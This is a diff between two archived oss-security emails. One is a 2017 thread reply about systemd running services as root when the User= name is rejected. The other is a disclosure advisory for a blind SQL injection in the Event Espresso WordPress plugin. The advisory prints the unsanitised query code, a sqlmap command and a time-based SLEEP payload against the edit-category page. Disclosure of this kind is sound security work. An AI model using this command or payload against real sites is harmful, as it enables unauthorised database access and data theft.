@@ -1,88 +1,54 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/05/13
-Message-ID: <1b6f7cd9-2eb7-2c2d-e2e0-327cf3dd1e82@oracle.com>
-Date: Wed, 5 Jul 2017 15:50:17 +0100
-From: John Haxby <john.haxby@...cle.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: systemd fails to parse user that should run service
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/11/12
+Message-id: <4E8FC4EB-4CE5-4AC4-A9E0-B304BC6B9683@me.com>
+Date: Tue, 11 Jul 2017 16:10:45 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Blind SQL injection in wordpress plugin event-espresso-free v3.1.37.11.L, fixed in v3.1.37.12.L
 Content-Type: text/plain; charset=utf-8
 
-On 05/07/17 14:53, Simon McVittie wrote:
-> On Wed, 05 Jul 2017 at 14:02:23 +0200, Casper.Dik@...cle.com wrote:
->>> 2) If user name specified in systemd unit file is syntactically correct
->>> (according to systemd check) but user name does not exist then systemd
->>> refuse to start that unit.
->>
->> Should systemd really valid usernames?  I would think that you would 
->> either use getpwnam(username) and if that fails you may then parse it as a 
->> numeric value.  If "0day" isn't a valid username according to getpwnam(), 
->> when converting it to a numeric uid should *also* fail because "0day" 
->> isn't a properly numeric value.
-> 
-> It *does* fail. The problem is in the handling of that failure. systemd
-> interprets that failure as "this line is nonsense, so behave as though the
-> line didn't exist" rather than "this line can be positively identified as
-> an attempt to name a nonexistent or unacceptable user, so fail to load
-> the unit". So User=7up does the same thing as User=0day - it doesn't
-> run as uid 7, which is 'lp' on my Debian system.
+Title: Blind SQL injection in wordpress plugin event-espresso-free v3.1.37.11.L
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-07-04
+CVE-ID:[CVE-2017-1002026]
+Download Site: https://wordpress.org/plugins/event-espresso-free/
+Vendor: https://eventespresso.com/
+Vendor Notified: 2017-07-07, fixed v3.1.37.12.L
+Vendor Contact: plugins@...dpress.org
+Advisory: http://www.vapidlabs.com/advisory.php?v=197
+Description: Event Espresso Lite – Event Management and Registration System
+Vulnerability:
+The function  edit_event_category does not sanitize user-supplied input via the $id parameter before passing it into an SQL statement.  This allows a blind SQL attack by an authenticated user who can edit the event categories.
 
 
-And therein lies the problem.  "0day" and "7up" are valid user names
-according to Posix[1], they may or may not exist, but they are valid.
-You may think Posix is wrong to allow an initial digit, but that isn't
-the issue.  The problem is that systemd treats an "invalid" username as
-either an integer or not specified and in either case this results in a
-program running as the wrong user, probably as root.
+2-function edit_event_category(){
+3-	global $wpdb;
+4-	
+5:	$id=$_REQUEST['id'];
+6-	$results = $wpdb->get_results("SELECT * FROM ". EVENTS_CATEGORY_TABLE ." WHERE id =".$id);
+7-	foreach ($results as $result){
+8-		$category_id = $result->id;
+9-		$category_name = stripslashes($result->category_name);
+10-		$category_identifier = stripslashes($result->category_identifier);
 
-Having systemd balk at what Posix considers to be a valid username is a
-bug that systemd is free to say "this is stupid, we're not allowing
-that".   If, as appears to be the case, systemd says "that username is
-stupid, we're going to interpret it differently" then that's when we
-need a CVE because, to my mind on this hot and sunny say, that's systemd
-apparently doing something for security that it is not.
-
-jch
-
-
-[1]
-http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap03.html#tag_03_431
-
-
-
-> 
->     % cat /etc/systemd/system/demo.service
->     [Unit]
->     Description=Demonstration
-> 
->     [Service]
->     Type=oneshot
->     ExecStart=/usr/bin/id
->     User=7up
->     % sudo systemctl daemon-reload
->     % sudo systemctl start demo.service
->     % sudo systemctl status demo.service
->     ...
->     Jul 05 14:47:11 host systemd[1]: /etc/systemd/system/demo.service:7:
->     Invalid user/group name or numeric ID, ignoring: 7up
->     Jul 05 14:47:11 host systemd[1]: Starting Demonstration...
->     Jul 05 14:47:11 host id[27282]: uid=0(root) gid=0(root) groups=0(root)
->     Jul 05 14:47:11 host systemd[1]: Started Demonstration.
->     Jul 05 14:47:11 host systemd[1]: /etc/systemd/system/demo.service:7:
->     Invalid user/group name or numeric ID, ignoring: 7up
->     Jul 05 14:47:17 host systemd[1]: /etc/systemd/system/demo.service:7:
->     Invalid user/group name or numeric ID, ignoring: 7up
->     Jul 05 14:48:25 host systemd[1]: /etc/systemd/system/demo.service:7:
->     Invalid user/group name or numeric ID, ignoring: 7up
-> 
-> (The error message in the Journal is presumably repeated because systemd
-> re-parses User when looking for ExecStartPre, ExecStart, ExecStop and
-> ExecStopPost commands, even though in this case there is only ExecStart.)
-> 
-> The default user to run system units, if no user is specified, is root,
-> because for system services that's the right thing more often than not,
-> analogous to how LSB init scripts always run as root and can drop
-> privileges themselves if they want to.
-> 
->     S
-> 
-
+Export: JSON TEXT XML
+Exploit Code:
+	• $ sqlmap -u 'http://example.com/wordpress/wp-admin/admin.php?page=event_categories&action=edit&id=*' --load-cookies=./cookie.txt --level=2 --risk=2 --dbms=mysql
+	•  
+	•  
+	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+	• sqlmap identified the following injection point(s) with a total of 364 HTTP(s) requests:
+	• ---
+	• Parameter: #1* (URI)
+	•     Type: AND/OR time-based blind
+	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+	•     Payload: http://example.com:80/wordpress/wp-admin/admin.php?page=event_categories&action=edit&id=(CASE WHEN (6856=6856) THEN SLEEP(5) ELSE 6856 END)
+	• ---
+	• [14:53:44] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Ubuntu 16.04 (xenial)
+	• web application technology: Apache 2.4.18
+	• back-end DBMS: MySQL >= 5.0.12
+	• [14:53:44] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
+	•  
+	• [*] shutting down at 14:53:44
+	•  
